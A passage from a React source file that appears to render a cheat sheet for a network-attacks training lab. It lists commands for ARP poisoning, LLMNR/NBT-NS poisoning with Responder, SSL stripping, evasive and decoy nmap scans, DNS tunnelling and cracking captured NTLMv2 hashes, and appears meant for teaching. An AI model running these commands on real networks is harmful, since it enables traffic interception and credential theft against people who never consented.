                ['tcpdump -i eth0 -w cap.pcap not port 22', 'Capture traffic (exclude SSH)'],
                ['echo 1 > /proc/sys/net/ipv4/ip_forward', 'Enable IP forwarding (MITM)'],
                ['arpspoof -i eth0 -t victim gw', 'ARP poison victim toward gateway'],
                ['responder -I eth0 -rdwv', 'LLMNR/NBT-NS poisoning'],
                ['bettercap -iface eth0', 'Launch bettercap MITM framework'],
                ['sslstrip -l 8080', 'SSL stripping proxy'],
                ['nmap -sN -f target', 'NULL scan with packet fragmentation'],
                ['nmap -D RND:10 target', 'Decoy scan (hide in fake IPs)'],
                ['iodine -f -P pass tunnel.domain.com', 'DNS tunnelling client'],
                ['ssh -D 1080 -N user@server', 'Dynamic SOCKS proxy over SSH'],
                ['hashcat -m 5600 ntlmv2.hash wordlist', 'Crack Responder-captured hashes'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#020606', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.68rem', flexShrink: 0, whiteSpace: 'pre' }}>{cmd}</code>
                  <span style={{ color: '#3a8a8a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #002a2a', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/network-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#2a6a6a' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/cloud-security/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#2a6a6a' }}>MOD-09 CLOUD SECURITY LAB &#8594;</Link>
      </div>
    </div>
  )
}
